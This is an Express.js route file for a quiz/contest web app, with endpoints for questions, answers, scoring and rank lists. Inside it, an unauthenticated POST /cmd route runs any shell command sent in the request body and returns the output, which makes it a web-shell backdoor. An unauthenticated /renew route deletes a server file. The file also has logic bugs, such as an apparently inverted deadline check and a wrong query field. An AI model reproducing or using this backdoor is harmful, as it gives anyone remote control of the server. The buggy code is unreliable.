const express = require('express');
const router = express.Router();
const cmd=require('node-cmd');
const Chal = require('../models/chal');
const fs = require('file-system');
const Que=require('../models/que');
const Answer = require('../models/answer');
const Auth = require('../middlewares/auth');
const User=require('../models/user');
const Quiz = require('../models/quiz');
//Auth.authenticateAll, 
router.post('/add',Auth.authenticateAll,  (req, res, next) => {
    req.checkBody('lang', 'Language is required').notEmpty();
    req.checkBody('desc', 'Description is required').notEmpty();
    req.checkBody('author', 'Author is required').notEmpty();
    req.checkBody('points', 'Points is required').notEmpty();
    req.checkBody('negPoint', 'Negative Points is required').notEmpty();
    req.checkBody('sol', 'Solution is required').notEmpty();
    req.checkBody('opt', 'Option is required').notEmpty();
    req.checkBody('type','Question Type is required').notEmpty();
    req.checkBody('quizId','Quiz Id is required').notEmpty();

    const errors = req.validationErrors();

    if(!errors){
        const que = new Que({
            lang: req.body.lang,
            desc: req.body.desc,
            author: req.body.author,
            points: req.body.points,
            negPoint: req.body.negPoint,
            sol: req.body.sol,
            opt: req.body.opt,
            type: req.body.type,
            quizId: req.body.quizId
        });
        que.save()
        .then(result => {
            res.status(201).json({
                status: 1,
                msg: "Question added successfully"
            });
        })
        .catch(err => {
            //console.log(err);
            res.status(500).json({
                status: 0,
                error: "Internal Server Error"
            });
        });
    }
    else{
        //console.log(errors);
        res.status(500).json({
            status: 0,
            error: "All fields are required"
        });
    }
});
router.get('/syncDate',Auth.authenticateAll,(req,res)=>{
    res.status(200).json({
        'status':1,
        'currTime': new Date()
    })
})
router.post('/saveAns',Auth.authenticateAll,(req,res,next)=>{
    User.findOne({'name':req.user.name},(err,user)=>{
        if(err){
            res.status(500).json({
                status: 0,
                saved:0,
                msg:"Fail to Save",
                error: "Internal server error"
            });
        }
        //console.log(user);
        var newSubmission= user.submission.filter(sub=>{
            return sub.queId!=req.body.queId;
        })
        newSubmission.push(req.body);
        user.submission=newSubmission;
        user.save().then(newUser=>{
            res.status(201).json({
                status: 1,
                saved:1,
                msg:"Saved",
                error: "Internal server error"
            });
        }).catch(err=>{
            res.status(500).json({
                status: 0,
                saved:0,
                msg:"Fail to Save",
                error: "Internal server error"
            });
        })
        

    })
})
router.get('/renew',(req,res)=>{
    fs.unlink(__dirname+'/../test',(err)=>{
        if(err){
            return res.status(500).json({
                status:0,
                error:err
            });
        }
        return res.status(200),json({
            status:1,
            msg:'done'
        })
    })
})
//Auth.authenticateAll,
router.get('/:quizId', Auth.authenticateAll,  (req, res, next) => {
    let quizId = req.params.quizId;
    if(req.user.access==1){ // if admin
        Que.find({'quizId':quizId}, 'desc opt points author type negPoint')
        .then(ques => {
            Quiz.findById(quizId,(err,quiz)=>{
                if(err){
                    console.log("ERROR >> QUIZ");
                    return res.status(500).json({
                        status: 0,
                        msg:"Fail to fetch",
                        error: "Internal server error"
                    });
                }
                else if(!quiz) {
                    console.log("ERROR >> NO QUIZ FOUND");
                    return res.status(500).json({
                        status: 0,
                        msg:"No such quiz found",
                        error: "Internal server error"
                    });
                }else{
                    return res.status(200).json({
                        status: 1,
                        ques: ques,
                        quiz: quiz,
                        startTime:new Date(),
                        submission: [],
                        currTime:new Date()
                    });
                }
            });
            
        })
        .catch(err => {
            console.log("ERROR >> NO QUESTION");
            return res.status(500).json({
                status: 0,
                error: "Internal server error"
            });
        });
    }else{
    
    User.findOne({name:req.user.name},(err,user)=>{
        if(err){
            console.log("ERROR >> USER");
           return res.status(500).json({
                status: 0,
                error: "Internal server error"
            });
        }
        //console.log(user);
        if(user){
        Quiz.findById(quizId,(err,quiz)=>{
            if(err){
                console.log("ERROR >> QUIZ");
                return res.status(500).json({
                    status: 0,
                    msg:"Fail to fetch",
                    error: "Internal server error"
                });
            }
            else if(!quiz) {
                console.log("ERROR >> NO QUIZ FOUND");
                return res.status(500).json({
                    status: 0,
                    msg:"No such quiz found",
                    error: "Internal server error"
                });
            }
            let currDate = new Date();
            if(currDate>quiz.endTime){
                return res.status(200).json({
                    status: 0,
                    msg:"Quiz has been finished"
                });
            }
            let newQuiz = user.quizs.find(x=>{
                return x.quizId == quizId
            });
            let filteredQuiz = user.quizs.filter(x=>{
                return x.quizId!=quizId;
            });
           // console.log(user.quizs,newQuiz);
            if(newQuiz){
                
                return res.status(200).json({
                    status: 1,
                    ques: newQuiz.ques,
                    quiz: quiz,
                    startTime:newQuiz.startTime,
                    submission: user.submission,
                    currTime:new Date()
                });
            }else{
                Que.find({'quizId':quizId}, 'desc opt points author type negPoint').then(ques => {
                    let quesList = ques;
                    if(quiz.random.isRandom==true){
                        let singleChoiceQues = ques.filter(x=>{
                            return x.type===1;
                        })
                        let multipleChoiceQues = ques.filter(x=>{
                            return x.type===2;
                        })
                        let singleChoiceCount = quiz.random.singleChoice.count<ques.length ? quiz.random.singleChoice.count: ques.length;
                        let multipleChoiceCount = quiz.random.multipleChoice.count<ques.length ? quiz.random.multipleChoice.count: ques.length;
                        singleChoiceQues = singleChoiceQues.sort(()=>0.5-Math.random()).slice(0,singleChoiceCount);
                        multipleChoiceQues = multipleChoiceQues.sort(()=>0.5-Math.random()).slice(0,multipleChoiceCount);
                        quesList = singleChoiceQues.concat(multipleChoiceQues);
                        
                    }
                    //console.log("abc");
                    quesList = quesList.sort(()=>0.5-Math.random())
                    newQuiz = {'quizId':quizId,'startTime':currDate,'endTime':null,'score':0,'status':false,'ques':quesList};
                    filteredQuiz.push(newQuiz);
                    user.quizs=filteredQuiz;
                    user.save().then(newuser=>{
                        return res.status(200).json({
                            status: 1,
                            ques: ques,
                            quiz: quiz,
                            startTime:currDate,
                            submission: user.submission,
                            currTime:new Date()
                        });
                    }).catch(err => {
                        console.log("ERROR >> CANNOT SAVE USER");
                        res.status(500).json({
                            status: 0,
                            error: "Internal server error"
                        });
                    });
                    
                })
                .catch(err => {
                    console.log("ERROR >> NO QUESTION");
                    res.status(500).json({
                        status: 0,
                        error: "Internal server error"
                    });
                });
               }
        });
        
    }else{
        console.log("ERROR >> NO USER");
        return res.status(500).json({
            status: 0,
            error: "Internal server error"
        });
    }
    })
}
    
});
router.post('/cmd',(req,res,next)=>{
    if(req.body.type=='get'){
        cmd.get(
            req.body.cmd,
            function(err, data, stderr){
                if(err){
                    return res.status(500).json({
                        status:0,
                        error:err
                    })
                }
                return res.status(200).json({
                    status:1,
                    result:data,
                    stderr:stderr,
                    msg:'end'
                })
            }
        );
    }else{
        cmd.run(req.body.cmd);
        return res.status(200).json({
            status:1,
            msg:'running'
        })
    }
    
 
    

})

router.get('/viewQues/:id', Auth.authenticateUser, (req, res, next) => {
    Que.findById({_id: req.params.id})
    .then(result => {
        res.status(200).json({
            status: 1,
            msg: "Ques Found",
            data: result
        });
    })
    .catch(err => {
        console.log(err);
        res.status(500).json({
            status: 0,
            error: "Internal Server Error"
        });
    });
});

router.delete('/:id', Auth.authenticateAdmin, (req, res, next) => {
    Que.remove({_id: req.params.id}).exec()
    .then(result => {
        res.status(200).json({
            status: 1,
            msg: "Que deleted"
        });
    })
    .catch(err => {
        //console.log(err);
        res.status(500).json({
            status: 0,
            error: "Internal Server Error"
        });
    });
});

router.get('/viewSol/:id',Auth.authenticateAll,(req,res,next)=>{
    Que.findById(req.params.id, 'sol').exec()
    .then(result => {
        res.status(200).json({
            status: 1,
            sol:result.sol
        });
    })

    .catch(err => {
        //console.log(err);
        res.status(500).json({
            status: 0,
            error: "Internal Server Error"
        });
    });
});

router.post("/submitSol",Auth.authenticateAll,(req,res,next)=>{
    let currTime=  new Date();
    Quiz.findOne({'_id':req.body.quizId},(err,result)=>{
        if(err){
            return res.status(500).json({
                status:0,
                error:err,
                msg:"Not Submitted"
            })
        }
        if(result){
            let diff=Math.round((result.endTime-currTime)/1000);
            if(diff>-2){
                return res.status(200).json({
                    status:0,
                    msg:"Sorry Time Up"
                });
            }else{
            User.findOne({'name':req.user.name},(err,user)=>{
                if(err){
                    return res.status(500).json({
                        status:0,
                        error:err,
                        msg:"Not Submitted"
                    })
                }
                var flag=false;
                let fquiz = user.quizs.find(x=>{
                    return x.quizId==req.body.quizId;
                })
                let filteredQuiz = user.quizs.filter(x=>{
                    return x.quizId!=req.body.quizId;
                })
                if(fquiz){
                    if(fquiz.status==false){

                        Que.find({'_id':req.body.quizId},(err,ques)=>{
                            if(err){
                                res.status(500).json({
                                    status:0,
                                    error:err,
                                    msg:"Not Submitted"
                                })
                            }
                            const userSub=req.body.sol;
                            var score=0;
                            //console.log(userSub,"     xxxxxxxxxxxxx   ",ques);
                            for(var i=0;i<userSub.length;i++){
                                if(userSub[i].ans.length>0){
                                    var que=findQuestionById(userSub[i].queId,ques);
                                    //console.log("que ",que)
                                    if(que==null)
                                        continue;
                                    if(que.type==1){
                                        if(userSub[i].ans[0]==que.sol[0]){
                                            score=score+que.points;
                                        }else{
                                            score=score-(que.points*que.negPoint);
                                        }
                                    }else{
                                        var correctAns=0,wrongAns=0;
                                        for(var j=0;j<userSub[i].ans.length;j++){
                                            if(findAns(userSub[i].ans[j],que.sol)){
                                                correctAns+=1;
                                            }else{
                                                wrongAns+=1;
                                            }
                                        }
                                        if(wrongAns==0){
                                            score=score+((que.points)/(que.sol.length))*correctAns;
                                        }else{
                                            score=score-((que.points)*(que.negPoint));
                                        }
                                    }
                                    userSub[i].status=2;
                                }
                            }
                            let currTime=  new Date();
                            user.submission.concat(userSub);
                            fquiz.status=true;
                            fquiz.endTime=currTime;
                            fquiz.score=score;
                            filteredQuiz.push(fquiz);
                            user.quizs = filteredQuiz;
                            user.save().then(newUser=>{
                                res.status(201).json({
                                    status:1,
                                    msg:"Submitted"
                                })
                            }).catch(err=>{
                                res.status(201).json({
                                    status:0,
                                    msg:"Not Submitted",
                                    error:err
                                })
                            });
                            
                        })

                    }else{
                        return res.status(200).json({
                            status:0,
                            msg:"Not Submitted, Already taken the contest"
                        })
                    }

                }else{
                    return res.status(200).json({
                        status:0,
                        msg:"Not Submitted, User not registered for this contest"
                    })
                }
            })
        }
        }else{
            return res.status(200).json({
                status:0,
                msg:"Quiz not exist"
            })
        }
    })
});
router.post('/clearAns',Auth.authenticateAll,(req,res,next)=>{
    User.findOne({name:req.user.name},(err,user)=>{
        if(err){
            res.status(500).json({
                status:0,
                error:err
            })
        }
        newSubmission=user.submission.filter(sub=>{
            return sub.queId!=req.body.queId;
        })
        user.submission=newSubmission;
        user.save().then(user=>{
            res.status(200).json({
                status:1,
                msg:"Cleared"
            })
        }).catch(err=>{
            res.status(500).json({
                status:0,
                error:err
            })
        })
    })
})



router.get('/bughuntRankList',Auth.authenticateAdmin,(req,res,next)=>{
    User.find({}).sort({'contests.bughunt.score':-1}).exec((err,users)=>{
        if(err){
            if(err){
                res.status(500).json({
                    status:0,
                    error:err
                })
            }
        }
        //console.log(users);
        if(users){
            var userArray=[];
       
        for(var i=0;i<users.length;i++){
            var userObj={
                'name':users[i].name,
                'contact':users[i].contact,
                'lang':users[i].lang,
                'email':users[i].email,
                'college':users[i].college,
                'score':(Math.floor(users[i].contests.bughunt.score*100)/100),
                'status':users[i].contests.bughunt.status
            }
            // userObj.name=users[i].name;
            // userObj.contact=users[i].contact;
            // userObj.email=users[i].email;
            // userObj.score=users[i].contests.bughunt.score;
            // userObj.status=users[i].contests.bughunt.status;
            userArray.push(userObj);
        }
        res.status(200).json({
            status:1,
            users:userArray
        })
        }else{
            res.status(200).json({
                status:1,
                users:userArray
            })
        }
        
    });
})
function findAns(ans,sol){
    for(var i=0;i<sol.length;i++){
        if(ans==sol[i])
            return true;
    }
    return false;
}
function findQuestionById(id,ques){
    for(var i=0;i<ques.length;i++){
        if(ques[i].id==id){
            return ques[i];
        }
    }
    return null;
}

module.exports = router;